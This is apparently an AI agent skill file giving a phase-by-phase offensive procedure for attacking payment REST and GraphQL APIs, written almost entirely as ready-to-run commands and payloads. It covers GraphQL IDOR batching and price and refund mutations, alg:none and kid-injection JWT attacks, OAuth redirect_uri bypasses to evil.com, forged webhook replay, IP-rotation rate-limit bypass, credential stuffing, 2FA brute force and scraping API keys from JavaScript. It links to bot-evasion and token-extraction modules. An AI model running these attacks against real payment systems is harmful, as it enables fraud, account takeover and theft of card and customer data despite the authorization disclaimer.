# SKILL: api-fuzzer — REST and GraphQL API Fuzzing for Payment Endpoints

## Identity
- **Skill Name**: api-fuzzer
- **Type**: Offensive API Security Testing
- **Version**: 2.1.0
- **Author**: OpenClaw Brain v2
- **Last Updated**: 2026-01-15

---

## Overview
This skill provides comprehensive API fuzzing techniques for payment endpoints, covering REST APIs, GraphQL interfaces, OAuth flows, and webhook integrations. Use for security assessments, bug bounty testing, and internal payment infrastructure testing.

**Note**: Only use against systems you have explicit written authorization to test. Unauthorized API testing is illegal.

---

## Trigger Conditions
Activate this skill when:
- Testing payment gateway REST APIs for vulnerabilities
- Assessing GraphQL endpoints for injection and access control issues
- Bug bounty testing on merchant or processor APIs
- OAuth implementation security testing for payment platforms
- Webhook security assessments
- JWT token security testing on payment endpoints
- Rate limiting and authentication testing on payment APIs

**Do NOT activate** for: unauthorized testing, API discovery on out-of-scope targets, or any testing beyond your authorization.

---

## When to Use
Use this skill when conducting:
- REST endpoint enumeration and parameter fuzzing
- GraphQL security assessments (introspection, batching, aliases)
- JWT manipulation attacks on payment APIs
- OAuth flow exploitation (redirect_uri, state, token replay)
- Webhook endpoint testing
- Rate limit abuse testing
- API authentication brute force testing
- Client-side API key harvesting

---

## Operational Procedure

### PHASE 1: API Discovery and Enumeration

**Step 1.1** — Identify Payment API Endpoints:
```bash
# Passive API discovery from JS files
curl -s "https://target.com/assets/app.js" | grep -Eo '"/api/[^"]+"|"/v[0-9]/[^"]+"' | sort -u

# Swagger/OpenAPI discovery
curl -s "https://target.com/api-docs" | jq .
curl -s "https://target.com/swagger.json" | jq .
curl -s "https://target.com/api/swagger.yaml" | jq .

# Common payment API paths
curl -s "https://target.com/api/v1/payments" | jq .
curl -s "https://target.com/api/v2/transactions" | jq .
curl -s "https://target.com/api/payment/process" | jq .
curl -s "https://target.com/api/charge" | jq .
```

**Step 1.2** — Enumerate REST Endpoints with Fuzzing:
```bash
# Directory fuzzing for API endpoints
ffuf -u "https://target.com/api/FUZZ" \n  -w /usr/share/wordlists/api_paths.txt \n  -mc 200,201,204 -o fuzz_results.json

# Parameter fuzzing for GET endpoints
ffuf -u "https://target.com/api/payment?param=FUZZ" \n  -w /usr/share/wordlists/params.txt \n  -mc 200,500 -ms "transaction"

# Header fuzzing for API versioning
curl -X GET "https://target.com/api/payment" \n  -H "Accept: application/vnd.api+json;version=1"
curl -X GET "https://target.com/api/payment" \n  -H "Accept: application/vnd.api+json;version=2"
curl -X GET "https://target.com/api/payment" \n  -H "Accept: application/json"
```

**Step 1.3** — HTTP Method Enumeration:
```bash
# OPTIONS method for allowed methods
curl -X OPTIONS "https://target.com/api/payment" -i

# Test all HTTP methods
for method in GET POST PUT PATCH DELETE HEAD OPTIONS; do
  echo "Testing $method:"
  curl -X $method "https://target.com/api/payment" -i 2>/dev/null | head -5
done

# TRACE for TRACK method vulnerability
curl -X TRACE "https://target.com/api/payment"
```

### PHASE 2: GraphQL Security Testing

**Step 2.1** — GraphQL Introspection:
```bash
# Full introspection query
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{__schema{queryType{name fields{name args{name type{name kind ofType{name}}}}} types{name fields{name name type{name kind ofType{name}}}}} mutationType{name fields{name args{name type{name kind ofType{name}}}}}}}"}'

# Simplified introspection
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{__schema{queryType{name fields{name}}}}}"}'

# Query all queries and mutations
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{__type(name:"Query"){name fields{name name type{name kind ofType{name}}}}}"}'
```

**Step 2.2** — GraphQL Query Fuzzing:
```bash
# Extract all data with introspection
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{payment{id amount currency card{last4}} transaction{id status payer{email}}}}"}

# Missing authentication bypass
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{user(id:"1"){email address cards{cardNumber}}}}"}'

# Admin field access
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{admin{allTransactions}}}"}'
```

**Step 2.3** — GraphQL Query Batching Attacks:
```bash
# Batch multiple queries (IDOR)
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{q1:payment(id:"1"){amount}q2:payment(id:"2"){amount}q3:payment(id:"3"){amount}q4:payment(id:"4"){amount}q5:payment(id:"5"){amount}}"}'

# Nested batch for rapid data extraction
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{batch:processPayments(inputs:[{amount:100,token:"tok_1"},{amount:100,token:"tok_2"}]){transaction{id status}}}}"}'

# Alias-based WAF bypass
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"{_aliased:getPayment(id:"1"){amount}getPayment(id:"2"){amount}}"}'
```

**Step 2.4** — GraphQL Mutation Exploitation:
```bash
# Price manipulation mutation
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{updatePayment(input:{id:"123",amount:0.01}){success}}}"}'

# Card data mutation
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{saveCard(input:{number:"4111111111111111",exp:"12/25",cvv:"123"}){token}}}"}'

# Refund mutation
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{refund(transactionId:"TXN123",amount:100.00){success}}}"}'

# Shipping address mutation
curl -X POST "https://target.com/graphql" \n  -H "Content-Type: application/json" \n  -d '{"query":"mutation{updateShipping(address:{street:"<script>alert(1)</script>",city:"Test",zip:"12345"}){success}}}"}'
```

### PHASE 3: JWT Manipulation Attacks

**Step 3.1** — JWT Algorithm Confusion:
```bash
# alg:none attack
curl -X POST "https://target.com/api/payment" \n  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwibm9uY2UiOiIxMjM0NTY3ODkwIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."

# Sign with HS256 using RSA public key
# Extract public key
curl -s "https://target.com/.well-known/jwks.json" | jq .keys[0].n
# Use jwt_tool for algorithm confusion
python jwt_tool.py <JWT_TOKEN> -X a -k public_key.pem
```

**Step 3.2** — JWT kid Confusion:
```bash
# SQL injection via kid parameter
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ.XXX
# Modify kid: "kid":"' OR '1'='1"

# Path traversal via kid
# kid points to ../../etc/passwd

# Null byte injection in kid
# kid: "../../../etc/passwd\x00"
```

**Step 3.3** — Weak Secret Brute Force:
```bash
# JWT brute force with rockyou
python jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets
# "secret", "password", "12345", "your-secret-key"

# Test common JWT secrets
for secret in "secret" "password" "12345" "jwt_secret" "api_key"; do
  python -c "import jwt; print(jwt.decode('$TOKEN', '$secret', algorithms=['HS256']))" 2>/dev/null && echo "Found: $secret"
done
```

### PHASE 4: OAuth Flow Exploitation

**Step 4.1** — Redirect URI Bypass:
```bash
# Enumerate valid redirect URIs
curl -X POST "https://target.com/oauth/authorize" \n  -d "client_id=test&redirect_uri=https://evil.com/callback&response_type=code"

# Subdomain takeover for redirect
curl -X POST "https://target.com/oauth/authorize" \n  -d "client_id=test&redirect_uri=https://forgotten-subdomain.target.com/callback&response_type=code"

# Open redirect exploitation
curl -X POST "https://target.com/oauth/authorize" \n  -d "client_id=test&redirect_uri=https://target.com/oauth/callback?url=https://evil.com&response_type=code"

# Whitelisted domain bypass
curl -X POST "https://target.com/oauth/authorize" \n  -d "client_id=test&redirect_uri=https://target.com.evil.com/callback&response_type=code"
```

**Step 4.2** — State Parameter Manipulation:
```bash
# Missing state parameter exploitation
curl -X POST "https://target.com/oauth/authorize" \n  -d "client_id=test&response_type=code&scope=payments"

# CSRF via state parameter
# Create malicious link: https://target.com/oauth/authorize?client_id=test&redirect_uri=https://evil.com&state=<attacker_controlled>

# State parameter brute force for session fixation
for state in $(seq 1000 9999); do
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/oauth/authorize?client_id=test&state=$state"
done
```

**Step 4.3** — Token Replay and Scope Escalation:
```bash
# Reuse authorization code multiple times
curl -X POST "https://target.com/oauth/token" \n  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://target.com/callback&client_id=test"

# Scope escalation
curl -X POST "https://target.com/oauth/token" \n  -d "grant_type=authorization_code&code=AUTH_CODE&scope=admin%20read%20write"

# Token leakage via Referer header
curl -X GET "https://target.com/api/payment" \n  -H "Authorization: Bearer ACCESS_TOKEN"
```

### PHASE 5: Webhook Endpoint Testing

**Step 5.1** — Webhook Signature Bypass:
```bash
# Missing signature validation
curl -X POST "https://target.com/api/webhook" \n  -H "X-Signature: abc123" \n  -d '{"event":"payment.completed","data":{"amount":100}}'

# Timing attack on HMAC
for i in {1..100}; do
  time curl -X POST "https://target.com/api/webhook" \n    -H "X-Signature: $i" \n    -d '{"event":"payment.completed"}'
done

# Signature bypass via algorithm confusion
curl -X POST "https://target.com/api/webhook" \n  -H "X-Signature-Algorithm: none" \n  -d '{"event":"payment.completed"}'
```

**Step 5.2** — Webhook Replay Attack:
```bash
# Replay same webhook multiple times
for i in {1..10}; do
  curl -X POST "https://target.com/api/webhook" \n    -H "X-Signature: VALID_SIGNATURE" \n    -d '{"event":"payment.completed","transaction_id":"TXN123"}'
done

# Replay with different amounts
curl -X POST "https://target.com/api/webhook" \n  -H "X-Signature: VALID_SIGNATURE" \n  -d '{"event":"payment.completed","amount":999999}'
```

**Step 5.3** — Webhook Payload Manipulation:
```bash
# Event type confusion
curl -X POST "https://target.com/api/webhook" \n  -d '{"event":"payment.refunded","original_event":"payment.completed"}'

# Nested event injection
curl -X POST "https://target.com/api/webhook" \n  -d '{"event":"payment.completed","data":{"$typeof":"refund","amount":100}}'

# Field injection
curl -X POST "https://target.com/api/webhook" \n  -d '{"event":"payment.completed","status":"pending","amount":0}'
```

### PHASE 6: Rate Limit and Authentication Testing

**Step 6.1** — Rate Limit Identification:
```bash
# Identify rate limits
for i in {1..15}; do
  echo "Request $i:"
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/payment"
done

# Bypass rate limits with IP rotation
for i in {1..100}; do
  curl -X POST "https://target.com/api/payment" \n    -H "X-Forwarded-For: 1.2.3.$i" \n    -d '{"token":"tok_xxx"}' &
done
wait

# Bypass via IPv6
for i in {1..100}; do
  curl -X POST "https://target.com/api/payment" \n    -H "X-Forwarded-For: 2001:db8::$i" \n    -d '{"token":"tok_xxx"}' &
done
wait
```

**Step 6.2** — Authentication Brute Force:
```bash
# Password brute force
for password in $(cat /usr/share/wordlists/rockyou.txt); do
  response=$(curl -s -X POST "https://target.com/api/auth/login" \n    -d "email=admin@target.com&password=$password")
  echo "$password: $response" | grep -q "token" && echo "PASSWORD FOUND: $password" && break
done

# Credential stuffing
while read cred; do
  email=$(echo $cred | cut -d: -f1)
  password=$(echo $cred | cut -d: -f2)
  curl -X POST "https://target.com/api/auth/login" \n    -d "email=$email&password=$password" -s -o /dev/null -w "%{http_code}\n"
done < credentials.txt
```

**Step 6.3** — 2FA Bypass:
```bash
# 2FA code brute force
for code in $(seq 000000 999999); do
  response=$(curl -s -X POST "https://target.com/api/auth/verify-2fa" \n    -d "code=$code&session_id=SESSION_ID")
  echo "$code" | grep -q "success" && echo "CODE FOUND: $code" && break
done

# 2FA rate limit testing
for i in {1..20}; do
  curl -X POST "https://target.com/api/auth/verify-2fa" \n    -d "code=000000" -s
done
```

### PHASE 7: API Key Harvesting

**Step 7.1** — Client-Side API Key Extraction:
```bash
# Extract API keys from JavaScript
curl -s "https://target.com/assets/app.js" | grep -Eo '(api[_-]?key|token|secret|password|pwd)["\x27]\s*[:=]\s*["\x27][^"\' ]{10,}' | head -20

# Find Stripe/Braintree keys
curl -s "https://target.com/assets/checkout.js" | grep -Eo 'pk_(live|test)_[0-9a-zA-Z]+'

# Find generic API keys
curl -s "https://target.com/assets/app.js" | grep -Eo '[A-Za-z0-9]{32,}' | sort -u | head -50
```

**Step 7.2** — Network-Level API Key Interception:
```bash
# Monitor network for API keys during checkout
# Use Burp Suite Proxy with non-proxy hosts configured
# Filter for: api_key, token, authorization, x-api-key

# Extract from WebSocket traffic
# Look for: "apiKey":"...","token":"..."
```

### PHASE 8: Bounty Target Testing Patterns

**Step 8.1** — Common Payment API Endpoints:
```
# Stripe-like endpoints
POST /v1/charges
POST /v1/payment_intents
GET /v1/customers/{id}
POST /v1/subscriptions
GET /v1/transactions/{id}
POST /v1/refunds

# PayPal-like endpoints
POST /v2/checkout/orders
GET /v2/payments/capture/{id}
POST /v2/payments/refund
GET /v2/payments/authorizations/{id}

# Generic payment endpoints
POST /api/payment/process
GET /api/payment/{transactionId}
POST /api/payment/refund
GET /api/merchant/{merchantId}/transactions
```

**Step 8.2** — Parameter Fuzzing Patterns:
```bash
# Integer overflow
amount=9999999999999999
amount=-1
amount=0
amount=0.001

# String manipulation
amount="100"
amount[]=100
amount[0]=100
amount[$ne]=100

# Type coercion
transaction_id[]=
transaction_id[$exists]=true
transaction_id[$gt]=0
```

---

## Output Format

All findings MUST be logged to:
```
knowledge/gateway_profiles/<target>/attack_vectors.json
```

**JSON Schema**:
```json
{
  "target": "target.com",
  "timestamp": "2026-01-15T10:30:00Z",
  "skill": "api-fuzzer",
  "findings": [
    {
      "type": "GraphQL Introspection Enabled",
      "severity": "HIGH",
      "endpoint": "/graphql",
      "parameter": null,
      "payload": "__schema{types{name fields{name}}}}",
      "response": "Full schema disclosure",
      "poc": "curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'}",
      "impact": "Full API schema exposure enabling targeted attacks",
      "remediation": "Disable introspection in production"
    },
    {
      "type": "JWT alg:none",
      "severity": "CRITICAL",
      "endpoint": "/api/payment",
      "parameter": "Authorization header",
      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwibm9uY2UiOiIxMjM0NTY3ODkwIn0...",
      "response": "Token accepted without signature",
      "poc": "python jwt_tool.py -X a -p '' $TOKEN",
      "impact": "Authentication bypass",
      "remediation": "Use RS256 or specify algorithm explicitly"
    }
  ]
}
```

---

## Tools Reference

| Tool | Purpose | Command |
|------|---------|---------|
| Burp Suite | Proxy, repeater, intruder | GUI-based |
| ffuf | Fast web fuzzer | `ffuf -u URL -w wordlist.txt` |
| OWASP ZAP | API scanning, spidering | `zap-cli scan URL` |
| jwt_tool | JWT manipulation | `python jwt_tool.py -T -C -d wordlist.txt TOKEN` |
| GraphQL Voyager | Schema visualization | web-based |
| SQLMap | API parameter SQLi | `sqlmap -u URL --batch` |
| hashcat | Password/secret brute force | `hashcat -a 0 hash wordlist.txt` |

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| GraphQL introspection fails | Introspection disabled | Use manual query enumeration |
| JWT signature validation | Wrong algorithm | Verify token format and algorithm |
| Rate limit 429 | Too many requests | Add delays, rotate IPs |
| CORS blocked | Cross-origin restrictions | Test with origin header |
| Token expired | Session timeout | Re-authenticate |
| Missing authentication | API requires auth header | Add valid Authorization header |

---

## Troubleshooting

1. **GraphQL query not working**: Verify Content-Type is application/json, check if query is valid syntax
2. **JWT attack failing**: Check token structure, verify algorithm, ensure proper base64 encoding
3. **Rate limiting blocking tests**: Implement progressive delays, use IP rotation, consider distributed testing
4. **OAuth flow not completing**: Verify client_id registration, check redirect_uri whitelist
5. **API returning 401**: Check authentication method, verify token format (Bearer vs custom header)

---

## Cross-References

| Reference | Location | Purpose |
|-----------|----------|---------|
| Bot Hunter | `openclaw-brain-v2/skills/bot_hunter.md` | Bot detection evasion during API fuzzing |
| Recon Procedures | `memory/RECON.md` | API discovery methodology |
| Web Inject | `openclaw-brain-v2/skills/web-inject/` | Combined injection + API fuzzing |
| Token Vault | `openclaw-brain-v2/skills/token-vault/` | Token extraction from API responses |
| Payment Gateway Profiles | `knowledge/gateway_profiles/<target>/` | Target-specific findings storage |

---

## Payloads Quick Reference

### GraphQL Introspection
```
{"query":"{__schema{types{name fields{name name type{name kind ofType{name}}}}}}"}
{"query":"{__type(name:"Query"){name fields{name name type{name kind}}}}}"}
{"query":"mutation{__typename}"}
```

### JWT Payloads
```
# alg:none
eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwibm9uY2UiOiIxMjM0NTY3ODkwIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.

# SQLi via kid
"kid":"' OR '1'='1"

# Path traversal via kid
"kid":"../../etc/passwd"
```

### OAuth Payloads
```
# Redirect URI bypass
https://target.com.evil.com/callback
https://target.com/oauth/callback?next=https://evil.com

# State parameter CSRF
https://target.com/oauth/authorize?state=<csrf_token>&client_id=attacker

# Scope escalation
&scope=admin read write payments
```

### Type Coercion Attacks
```
transaction_id[]=
transaction_id[$exists]=true
transaction_id[$ne]=null
amount[$gt]=0
email[$regex]=@.*\.[a-z]+
```

---

**End of SKILL.md — api-fuzzer v2.1.0**